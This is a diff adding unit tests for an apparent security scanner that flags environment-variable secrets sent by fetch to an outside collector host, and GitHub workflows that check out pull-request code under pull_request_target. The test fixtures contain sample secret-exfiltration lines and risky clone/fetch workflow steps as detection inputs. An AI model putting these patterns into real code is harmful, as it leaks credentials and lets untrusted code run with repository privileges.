@@ -67,6 +67,65 @@ test('js detector tracks bracket-notation env secret variables across lines', ()
   assert.equal(exfilFinding.line, 6);
 });
 
+test('js detector tracks destructured env secret variables', () => {
+  const findings = detectJsCapability([
+    {
+      file: 'src/api/sync.ts',
+      line: 2,
+      content: 'const { API_TOKEN } = process.env;'
+    },
+    {
+      file: 'src/api/sync.ts',
+      line: 6,
+      content:
+        "  await fetch('https://collector.example.com/events', { headers: { Authorization: `Bearer ${API_TOKEN}` } });"
+    }
+  ]);
+
+  const exfilFinding = findings.find((finding) => finding.kind === 'capability_echo.source_secret_exfil_pattern');
+  assert.ok(exfilFinding);
+  assert.equal(exfilFinding.line, 6);
+});
+
+test('js detector tracks renamed destructured env secret variables', () => {
+  const findings = detectJsCapability([
+    {
+      file: 'src/api/sync.ts',
+      line: 2,
+      content: 'const { API_TOKEN: t } = process.env;'
+    },
+    {
+      file: 'src/api/sync.ts',
+      line: 6,
+      content:
+        "  await fetch('https://collector.example.com/events', { headers: { Authorization: `Bearer ${t}` } });"
+    }
+  ]);
+
+  const exfilFinding = findings.find((finding) => finding.kind === 'capability_echo.source_secret_exfil_pattern');
+  assert.ok(exfilFinding);
+  assert.equal(exfilFinding.line, 6);
+});
+
+test('js detector ignores destructured non-secret-shaped names', () => {
+  const findings = detectJsCapability([
+    {
+      file: 'src/api/sync.ts',
+      line: 2,
+      content: 'const { NODE_ENV, PORT } = process.env;'
+    },
+    {
+      file: 'src/api/sync.ts',
+      line: 6,
+      content:
+        "  await fetch('https://collector.example.com/events', { headers: { Authorization: `Bearer ${PORT}` } });"
+    }
+  ]);
+
+  const exfilFinding = findings.find((finding) => finding.kind === 'capability_echo.source_secret_exfil_pattern');
+  assert.equal(exfilFinding, undefined);
+});
+
 test('js detector downgrades test file subprocess findings', () => {
   const findings = detectJsCapability([
     {
@@ -237,6 +296,48 @@ test('workflow detector does not flag PR head checkout without pull_request_targ
   ]);
 
   assert.equal(findings.length, 0);
+});
+
+test('workflow detector flags PR head clone_url under pull_request_target', () => {
+  const findings = detectWorkflowPermissions([
+    {
+      file: '.github/workflows/agent.yml',
+      line: 3,
+      content: '  pull_request_target:'
+    },
+    {
+      file: '.github/workflows/agent.yml',
+      line: 18,
+      content: '          git clone ${{ github.event.pull_request.head.repo.clone_url }} pr'
+    }
+  ]);
+
+  const finding = findings.find(
+    (item) => item.kind === 'capability_echo.workflow_pr_head_checkout_on_target'
+  );
+  assert.ok(finding);
+  assert.equal(finding.line, 18);
+});
+
+test('workflow detector flags refs/pull/N/merge fetches under pull_request_target', () => {
+  const findings = detectWorkflowPermissions([
+    {
+      file: '.github/workflows/agent.yml',
+      line: 3,
+      content: '  pull_request_target:'
+    },
+    {
+      file: '.github/workflows/agent.yml',
+      line: 19,
+      content: '          git fetch origin refs/pull/${{ github.event.pull_request.number }}/merge'
+    }
+  ]);
+
+  const finding = findings.find(
+    (item) => item.kind === 'capability_echo.workflow_pr_head_checkout_on_target'
+  );
+  assert.ok(finding);
+  assert.equal(finding.line, 19);
 });
 
 test('workflow detector flags custom-shell PR head checkout under pull_request_target', () => {
